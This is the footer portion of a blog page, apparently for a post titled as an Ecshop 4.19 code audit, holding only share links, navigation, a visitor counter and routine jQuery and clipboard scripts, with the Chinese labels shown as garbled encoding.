  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&is_video=false&description=Ecshop4.19ä»£ç å®¡è®¡"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Ecshop4.19ä»£ç å®¡è®¡&body=Check out this article: http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Ecshop4.19ä»£ç å®¡è®¡"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Ecshop4.19ä»£ç å®¡è®¡"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Ecshop4.19ä»£ç å®¡è®¡"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Ecshop4.19ä»£ç å®¡è®¡"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&name=Ecshop4.19ä»£ç å®¡è®¡&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&t=Ecshop4.19ä»£ç å®¡è®¡"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> èœå•</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> ç›®å½•</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> åˆ†äº«</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> è¿”å›é¡¶éƒ¨</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024-2025
    Xsheep
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
      --><li><a href="/">é¦–é¡µ</a></li><!--
    --><!--
      --><li><a href="/archives/">å½’æ¡£</a></li><!--
    --><!--
      --><li><a href="/about/">å…³äº</a></li><!--
    --><!--
      --><li><a href="/link/">link</a></li><!--
    -->
      </ul>
      <ul>
        
          <!-- ä¸è’œå­ç»Ÿè®¡ -->
          <span id="busuanzi_container_site_pv">
              æœ¬ç«™æ€»è®¿é—®é‡<span id="busuanzi_value_site_pv"></span>æ¬¡
          </span>
          <span class="post-meta-divider">|</span>
          <span id="busuanzi_container_site_uv" style='display:none'>
                  æœ¬ç«™è®¿å®¢æ•°<span id="busuanzi_value_site_uv"></span>äºº
          </span>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        
      </ul>
    </nav>
  </div>
  
</footer>



    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"å¤åˆ¶åˆ°ç²˜è´´æ¿ï¼\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "å¤åˆ¶æˆåŠŸï¼");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
